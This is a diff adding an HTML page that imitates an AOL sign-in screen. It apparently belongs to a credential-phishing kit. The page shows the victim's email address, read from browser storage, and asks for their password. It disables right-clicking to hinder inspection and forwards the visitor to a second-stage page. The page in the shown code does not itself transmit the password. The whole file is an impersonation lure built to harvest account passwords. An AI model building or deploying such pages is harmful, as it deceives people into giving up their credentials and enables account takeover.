@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html id="Stencil" class="js grid light-theme">
+
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+    <meta charset="utf-8" />
+    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no" />
+    <link rel="stylesheet" type="text/css" href="styles\cf.css" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" />
+    <script src="styles/index.js" defer></script>
+
+    <title>AOL</title>
+</head>
+
+<body>
+    <header>
+        <div class="main">
+            <div class="for-left">
+                <img src="images/aol.png" id="logo" alt="">
+            </div>
+            <div class="for-right">
+                <a href="#">Help</a>
+            </div>
+        </div>
+    </header>
+    <section>
+        <div class="main-body">
+            <form>
+                <div class="main-box">
+                    <div class="logo">
+                        <img src="images/aol.png" id="logo" alt="">
+                    </div>
+                    <div class="for-email-showing">
+
+                    </div>
+                    <h2>Sigin</h2>
+                    <input type="password" id="password" placeholder="Enter your Password">
+                    <div class="button-main">
+                        <a href="#" onclick="locationNew()">Next</a>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </section>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        //    for loading  
+        //    for loading  
+        $('body').append('<div  class="loader-container"><img src="images/loading.png" class="img-laoding" /></div>');
+            $(window).on('load', function(){
+              setTimeout(removeLoader, 2000); //wait for page load PLUS two seconds.
+            });
+            function removeLoader(){
+                $( ".loader-container" ).fadeOut(500, function() {
+                  // fadeOut complete. Remove the loading div
+                  $( ".loader-container" ).remove(); //makes page more lightweight 
+              });  
+            }
+
+            
+            window.addEventListener("contextmenu", (e) => {
+              e.preventDefault();
+          })
+        function locationNew() {
+            window.location.assign("../AOL-two/AOL.html");
+        }
+        const emailGet = localStorage.getItem('aol');
+            document.querySelector(".for-email-showing").textContent = emailGet;
+
+    </script>
+</body>
+
+</html>
